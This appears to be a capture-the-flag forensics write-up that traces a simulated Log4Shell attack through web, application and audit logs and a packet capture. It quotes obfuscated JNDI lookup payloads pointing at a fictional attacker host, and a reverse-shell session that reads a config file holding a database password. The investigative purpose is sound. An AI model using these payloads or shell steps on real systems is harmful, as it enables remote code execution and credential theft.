# Ledger City

**Author:** Incendio

---

### Challenge Description
>
> Ledger City, 1986. Under the pink neon of Ocean Drive, the Night Ledger auction house lives by one rule: write everything down. Every bid, every lot and every handshake gets a log.
> 
> Last night, someone asked the house a very polite question. The house looked it up, a little too eagerly, and went out to fetch exactly what it was told to. By closing time, a secret that should never have left the vault had been read out loud, and a password was gone with it.
> 
> The staff swear it was just a shell game. Four logs and a packet capture say otherwise. Read between the logs, mind the shell, and don't trust every request that looks dangerous.
>

The challenge provides a case file (`evidence.zip`) and a netcat service (`nc <host> <port>`) that asks 16 questions, one at a time, and states the format it expects for each answer. The flag is printed after the last correct answer.

---

### How to Approach This Challenge

**Read the description like a client briefing.** Every phrase is a lead:

- "a password was gone with it" means a password leaked, and a leaked secret is the loudest clue in the whole case.
- "looked it up, a little too eagerly" points to a lookup the server should never have done.
- "went out to fetch exactly what it was told to" means the server reached out and downloaded something.
- "a shell game" means a shell shows up at some point.
- "four logs and a packet capture" is the evidence list, and each file is a different witness.
- "don't trust every request that looks dangerous" warns that there are decoys.

**Meet the five witnesses.** Each file sees the incident from a different place, and none of them sees all of it:

- `nginx_access.log` is the front door: who asked for what, and what answer they got.
- `nginx_error.log` holds routine proxy complaints. Skim it once and move on.
- `app.log` is the Java application's own diary, keyed by `requestId`.
- `auditd.log` is the operating system's view of processes and connections. It has only four lines, so read all of them.
- `capture.pcap` is the wire. It is the most trustworthy file and the biggest, so search it and never scroll it.

**Start from the loudest clue and walk backwards.** The story says a password leaked, so search for it first. The session that leaked it names the attacker, the attacker names the request, and the request names everything else.

---

### Solution Paths

---

### Question 1 — What is the attacker's IP address?

The question tells us nothing about how the attack happened, so we start backwards from the last step of the attack chain since it's the easiest one to find and the most important clue that can guide us to answer a lot of questions: a leaked password. We search the capture for it.

---

#### Method 1 — Hunt for the password in the PCAP (Best)

1. In Wireshark, apply this filter:

   `frame matches "pass"`

   or the broader, case-insensitive one:

   `frame matches "(?i)(passwd|pass|password|pwd)"`
2. The first filter returns a single frame, 12140, going from `198.51.100.23:48321` to `10.44.7.23:49172`. The broader filter returns three frames:
   - 12106, the class download from `198.51.100.23:80` (the class contains the string `pwd`)
   - 12137, a short line (`pwd`) sent from `10.44.7.23` to `198.51.100.23:48321`
   - 12140, the one with the password

   Every hit has the same outside host on the other end.
3. The terminal gives the same answer:

   `grep -a 'pass' capture.pcap`

   ```
   db_password=velvet-reef-94
   ```
4. Right-click frame 12140 and choose Follow → TCP Stream to read the whole conversation:

   ```
   whoami
   catalog
   $ id
   uid=1001(catalog) gid=1001(catalog) groups=1001(catalog)
   $ pwd
   /srv/nightledger/catalog
   $ cat /etc/nightledger/db.conf
   db_user=ledger_reader
   db_password=velvet-reef-94
   $
   ```
5. We now have a password, which may help the rest of the investigation, and most importantly the attacker IP address: the only outside host in that conversation is `198.51.100.23`.

---

#### Method 2 — Behaviour first (Longer)

1. A web application server should only answer the proxy (`10.44.0.10`). Filter for connections it starts towards the outside:

   `ip.src == 10.44.7.23 && tcp.flags.syn == 1 && tcp.flags.ack == 0 && !(ip.dst == 10.0.0.0/8)`
2. Four connections remain. Three go to `198.51.100.23` on ports 1389, 80 and 48321 within about 0.4 seconds (21:23:41.030, .210 and .390). The fourth goes to `198.51.100.80` much later and is an ordinary health check.
3. One host contacted three times, on three different ports, in under half a second is the attacker.

**Note:** sadly, NetworkMiner does not show the password. The cause is that NetworkMiner only pulls credentials out of protocols it knows how to parse, such as HTTP authentication and forms, FTP, SMTP or POP3/IMAP logins. Here the password is plain text inside a raw TCP stream on port 48321, with no login protocol around it, and it is not in any HTTP header, URL or body, so there is nothing for NetworkMiner to match. It still lists `LedgerSync.class` and the attacker host, but the password needs Wireshark or `grep`.

**Answer:** `198.51.100.23`

---

### Question 2 — Which request ID was the successful attack?

We have the attacker IP, so we just grep for it in the web logs and read the request ID:

`grep '198.51.100.23' nginx_*`

```
nginx_access.log:198.51.100.23 - m.vega [10/Dec/2021:21:23:41 +0000] "GET /api/v2/catalog HTTP/1.1" 200 8 "https://nightledger-auctions.net/catalog" "Mozilla/5.0 (X11; Linux x86_64) Firefox/91.0" "-" "${${lower:j}${lower:n}di:ldap://relay.blackglass-labs.net:1389/ledger}" host="nightledger-auctions.net" edge="203.0.113.44:443" server="10.44.0.10:443" upstream="10.44.7.23:8080" request_id=RID-941 rt=0.300
```

The request ID is `RID-941`. The attacker made exactly one request, and it got a 200.

The other logs agree. `grep -Hn '198.51.100.23' *.log` also hits `app.log`, where the DNS line carries `requestId=RID-941`, and `auditd.log`, where the `SOCKADDR` line carries the same IP.

---

#### Why not the other suspicious requests?

Seven requests in the web log belong to the incident, and only one came from our attacker:

| Request | Source | What it carried | Fate |
| --- | --- | --- | --- |
| RID-917 | 203.0.113.91 | `${jndi:ldap://old-index...}` in User-Agent | Rejected: invalid provider URL |
| RID-923 | 198.51.100.62 | `${${lower:j}ndi:dns://...}` in X-Api-Version | Rejected: DNS lookup timed out |
| RID-931 | 203.0.113.122 | `${${::-j}ndi:rmi://...}` in Referer | Rejected: RMI endpoint refused |
| RID-938 | 198.51.100.118 | `${jndi:ldap://relay.blackglass-labs.net:1389/old}` in User-Agent | Rejected: empty name |
| RID-940 | 203.0.113.191 | SQL injection (`UNION SELECT`) in the URL | 400, parser error, rolled back (`SQL-771`) |
| **RID-941** | **198.51.100.23** | **A disguised lookup in X-Api-Version** | **Lookup resolved, class loaded, status 200** |

(The seventh, RID-962, is an ordinary request a moment later.)

---

#### Method 2 — Work backwards from the effect

1. A successful attack must have caused something, such as a class loaded from a remote source:

   `grep CLASS_LOAD_COMPLETE app.log | grep 'source=http'`

   ```
   2021-12-10T21:23:41.245241Z INFO  [class-loader-12] jvmPid=821 requestId=RID-941 CLASS_LOAD_COMPLETE name=net.nightledger.sync.LedgerSync source=http://relay.blackglass-labs.net:80/LedgerSync.class bytes=2051
   ```
2. A plain `grep CLASS_LOAD_COMPLETE app.log` returns 61 lines, because ordinary class loads from local jars look the same. The `source=http` filter leaves one line.
3. Beware of the obvious keyword: `grep -n 'jndi' nginx_access.log` finds only RID-917 and RID-938, and both failed. The successful payload is disguised, so the plain word misses it.

**Answer:** `RID-941`

---

### Question 3 — Which CVE does this attack exploit?

The payload in the successful request is a `${jndi:ldap://...}` string hidden in a header that the application logs. A logging library that evaluates that string and connects out is the signature of Log4Shell.

---

#### Method 1 — Recognise it and verify

1. Search for the pattern: `jndi ldap header log4j remote code execution`.
2. Log4Shell is tracked as `CVE-2021-44228`.
3. Sanity check: the logs are dated 2021-12-10, the week the bug became public.

---

#### Method 2 — Reason from behaviour

1. A string inside a logged header triggered a remote lookup, then a class was fetched and loaded. That is remote code execution through log processing.
2. The original bug is `CVE-2021-44228`. The follow-up CVEs (`CVE-2021-45046`, `CVE-2021-45105`) were later patch bypasses and denial-of-service issues, not the attack in these logs.

**Answer:** `CVE-2021-44228`

---

### Question 4 — Which Java API does the payload use to make the lookup? (acronym)

The payload starts with the one word a good filter would block. We can read it in the application log, which shows the application resolving it:

`grep -n 'RID-941' app.log`

```
1806:2021-12-10T21:23:41.000394Z INFO  [http-nio-8080-exec-12] jvmPid=821 requestId=RID-941 header=X-Api-Version lookup resolved after substitution
1807:2021-12-10T21:23:41.010888Z INFO  [http-nio-8080-exec-12] jvmPid=821 requestId=RID-941 JndiLookup resolved ${jndi:ldap://relay.blackglass-labs.net:1389/ledger}
```

In the web log the same value is written as `${${lower:j}${lower:n}di:ldap://...}`. Rebuild it: `j` + `n` + `di` gives `jndi`, the Java Naming and Directory Interface.

**Answer:** `JNDI`

---

### Question 5 — Which lookup function hides the keyword in the successful payload?

Why would anyone write `${${lower:j}${lower:n}di:...}`? Because a WAF rule or a quick `grep jndi` would never see the word. Log4j expands the inner lookups first, so `${lower:j}` becomes `j`, and the final string is a normal `jndi` lookup.

---

#### Method 1 — Read the payload

1. Take the X-Api-Version value from the RID-941 line (see Question 2).
2. The nested function in front of `j` and `n` is `lower`.

---

#### Method 2 — Compare the disguises

1. The other payloads use their own tricks: RID-923 uses `${lower:j}ndi` and RID-931 uses `${::-j}ndi` (a default-value lookup).
2. The question asks about the successful payload, and that one wraps both `j` and `n` in `lower`.

**Answer:** `lower`

---

### Question 6 — How many other requests tried a similar lookup and failed?

The trap is in the counting. `grep jndi` finds 2, counting every 400 finds 5, and the real number needs both logs.

---

#### Method 1 — Count in the application log (Best)

`grep -n 'lookup rejected' app.log`

```
1784:2021-12-10T21:16:41.015599Z WARN  [http-nio-8080-exec-2] jvmPid=821 requestId=RID-917 lookup rejected; NamingException: invalid provider URL
1787:2021-12-10T21:17:52.015324Z WARN  [http-nio-8080-exec-3] jvmPid=821 requestId=RID-923 lookup rejected; SocketTimeoutException: DNS lookup timed out
1790:2021-12-10T21:19:03.015452Z WARN  [http-nio-8080-exec-4] jvmPid=821 requestId=RID-931 lookup rejected; ServiceUnavailableException: RMI endpoint refused
1792:2021-12-10T21:20:14.015800Z WARN  [http-nio-8080-exec-5] jvmPid=821 requestId=RID-938 lookup rejected; NamingException: empty name
```

Four failures. RID-940 is a SQL injection, not a lookup, so it does not count.

---

#### Method 2 — Count in the web log

1. `grep -E 'jndi|lower:|::-' nginx_access.log` returns five requests: RID-917, 923, 931, 938 and 941.
2. Remove the successful one (RID-941) and four remain.

**Answer:** `4`

---

### Question 7 — Which server did the application contact for the lookup? (host:port)

From the same output as Question 2, we take the header value of the successful request:

```
${${lower:j}${lower:n}di:ldap://relay.blackglass-labs.net:1389/ledger}
```

Resolve the disguise (`${lower:j}` is `j`, `${lower:n}` is `n`) and we get a normal lookup URL:

```
${jndi:ldap://relay.blackglass-labs.net:1389/ledger}
```

The application log confirms the resolved value (line 1807 above) and the next line shows the name resolving to the attacker:

```
1808:2021-12-10T21:23:41.018606Z INFO  [dns-resolver-12] jvmPid=821 requestId=RID-941 resolved relay.blackglass-labs.net to 198.51.100.23
```

The expected answer has the form `host:port`, so it is `relay.blackglass-labs.net:1389`. Giving only `relay.blackglass-labs.net` is incomplete.

---

#### Why the port is part of the endpoint

An endpoint is the place you connect to, and that means a host and a port. The port tells you which service on that host is meant. The default LDAP port is 389, but this server listens on `1389`. The same host also serves HTTP on port 80 in this case (it hands out the class file), so the host name alone does not say which service the application talked to. In the capture, the LDAP connection is a TCP connection to port 1389.

---

#### Why `/ledger` is not part of the endpoint

The `/ledger` at the end of the URL is the name of the entry the client asks for on that LDAP server. It says what to look up, not where to connect. It never appears in the addressing of the connection. In the capture it only appears inside the LDAP search request, in the payload on top of the TCP connection to `relay.blackglass-labs.net:1389`.

Beware of RID-938. It mentions the same host and port with the path `/old`, but it was rejected and the application never connected.

---

#### Method 2 — PCAP

1. Filter `dns.qry.name == "relay.blackglass-labs.net"`. The answer is `198.51.100.23`.
2. Filter `tcp.port == 1389` and follow the stream: an LDAP search from `10.44.7.23` and a reply from that host.

**Answer:** `relay.blackglass-labs.net:1389`

---

### Question 8 — Which class file was downloaded?

An LDAP server does not hand over code, it hands over directions to it. So we look for the referral the application received, which is the next line of the same output:

```
1809:2021-12-10T21:23:41.052292Z INFO  [http-nio-8080-exec-12] jvmPid=821 requestId=RID-941 LDAP referral received codebase=http://relay.blackglass-labs.net:80/LedgerSync.class
```

The URL ends in `LedgerSync.class`, and the class-load line right after it (Question 2) repeats the source and gives the size, `bytes=2051`.

---

#### Method 2 — PCAP (Best)

1. Filter `http.request.uri contains ".class"`. The request is frame 12104, from `10.44.7.23` to `198.51.100.23` on port 80.
2. Use File → Export Objects → HTTP to save the file.
3. Run `file LedgerSync.class`. It reports compiled Java class data, and `ls -l` shows 2051 bytes, the same size as `bytes=` in the class-load line. So the class that was loaded is the class that crossed the wire.

**Answer:** `LedgerSync.class`

---

### Question 9 — Which TCP port was used to download the class?

It is tempting to answer 8080, because that is where the application lives. The only reliable source is the URL or the packets. The referral and the class-load line both contain `http://relay.blackglass-labs.net:80/LedgerSync.class`, so the port is 80.

In the capture, filter `ip.addr == 198.51.100.23 && http.request`. The destination port of the `GET /LedgerSync.class` request is 80.

**Answer:** `80`

---

### Question 10 — Which destination TCP port did the Java application use to connect back out to the attacker?

This is the moment the server dials out again. We expect an unusual port, and we do not assume a famous one such as 4444. We read it from the evidence.

---

#### Method 1 — Audit log

`cat auditd.log`

```
type=SOCKADDR msg=audit(1639171421.390:9301): saddr=0200BCC1C63364170000000000000000 saddr_fam=inet laddr=198.51.100.23 lport=48321
```

The `SOCKADDR` line gives the endpoint in readable form: `198.51.100.23`, port `48321`. You can also decode the raw value by hand: `0200` is the family (IPv4), `BCC1` is the port, `C6336417` is the address.

`python3 -c "print(0xBCC1)"` prints `48321`, and `C6.33.64.17` is `198.51.100.23`.

---

#### Method 2 — PCAP

1. Reuse the filter from Question 1: `ip.src == 10.44.7.23 && tcp.flags.syn == 1 && tcp.flags.ack == 0 && ip.dst == 198.51.100.23`.
2. The third connection, at 21:23:41.390, goes to port 48321.

**Answer:** `48321`

---

### Question 11 — Which PID of the Java process initiated that connection?

The packet capture shows what connected, but it cannot name the process. The operating system can. We want the audit record that matches the connection by time and destination, and it is the one right above the `SOCKADDR` line:

```
type=SYSCALL msg=audit(1639171421.390:9301): arch=c000003e syscall=42 success=yes exit=0 a0=3 a1=7f31 a2=10 items=1 ppid=800 pid=821 ... comm="java" exe="/usr/bin/java" key="nl-shell-connect"
```

`syscall=42` is `connect()` on x86-64, the process is `java`, and `pid=821`.

Cross-check by time: `date -u -d @1639171421` gives 21:23:41, and the record's timestamp is `.390`, which matches the connection to port 48321 in the capture. `app.log` agrees: every line carries `jvmPid=821`, including the remote class load, so the class was loaded inside the process that then made the call.

**Answer:** `821`

---

### Question 12 — Which PID was the child process created afterwards?

A process that spawns a shell leaves a parent-and-child pair behind. We look for any process whose parent is the Java PID:

`grep 'ppid=821' auditd.log`

```
type=SYSCALL msg=audit(1639171421.440:9302): arch=c000003e syscall=59 success=yes exit=0 a0=7f31 a1=7f22 a2=0 a3=0 items=2 ppid=821 pid=827 ... comm="sh" exe="/usr/bin/dash" key="nl-process-exec"
```

`syscall=59` is `execve`, 50 ms after the connect, and the new process is `pid=827` with `ppid=821`.

Questions 11 and 12 are different questions: 821 is attribution (who made the connection), 827 is lineage (who was created as a result).

**Answer:** `827`

---

### Question 13 — Which program did the child process run?

An `EXECVE` record shows what was actually executed. Be careful with the `exe` field in the record above: it names the real binary behind the program, and on many Linux systems `/bin/sh` points at `dash`. The question asks what was executed:

```
type=EXECVE msg=audit(1639171421.440:9302): argc=1 a0="/bin/sh"
type=PROCTITLE msg=audit(1639171421.440:9302): proctitle=2F62696E2F7368
```

The `PROCTITLE` record stores the command line in hex. `echo 2F62696E2F7368 | xxd -r -p` prints `/bin/sh`.

**Answer:** `/bin/sh`

---

### Question 14 — How many commands were typed in the session?

We already followed the stream in Question 1. The session starts right after the shell appears (21:23:41.440) and is over by about 21:23:41.650. Filter `tcp.port == 48321 && tcp.len > 0` and the capture shows eight data frames (12133 to 12140), alternating between the two sides. One side sends four short lines, each answered with output and a ` $  ` prompt:

```
whoami
id
pwd
cat /etc/nightledger/db.conf
```

**Answer:** `4`

---

### Question 15 — Which file was read to obtain the password?

A password rarely appears out of nowhere. In the stream, the last command is the one that comes just before the credentials in the output:

```
$ cat /etc/nightledger/db.conf
db_user=ledger_reader
db_password=velvet-reef-94
```

A keyword check on the capture shows the same thing: `grep -a -o 'db_[a-z_]*=[a-z0-9_-]*' capture.pcap` prints the `db_user` and `db_password` lines.

**Answer:** `/etc/nightledger/db.conf`

---

### Question 16 — What password was exposed?

This is where we started. The password is in the reply to the last command, and it lives in one place only: it is not in the class, the application log, the audit log or either web log.

`grep -a 'pass' capture.pcap`

```
db_password=velvet-reef-94
```

The session sits in the middle of ordinary web, DNS, NTP, database, SSH and SMTP traffic, and the capture goes on for several minutes afterwards. It is not the last thing in the file, so scrolling to the end does not find it.

**Answer:** `velvet-reef-94`

**Flag:** `Securinets_fst{l0g4sh3ll_in_l3dg3r_c1ty}`

---

### Key Takeaway

This challenge teaches how to **follow one incident across independent witnesses**:

- Start from the loudest clue. A leaked password in the capture leads to the session, the session leads to the attacker, and the attacker leads to the request.
- No single file tells the whole story. The web log names the request, the application log shows what it did, the audit log names the process, and the capture shows the traffic.
- A dangerous-looking string is only an attempt. Success shows up in what happens next.
- Attackers disguise keywords, so searching for the keyword finds the decoys and misses the real request. Searching for the *effect* finds it.

The downloaded `LedgerSync.class` is a harmless simulation fixture. It opens no sockets and runs no commands, and the logs and capture model what a malicious class would have caused in this fictional case.
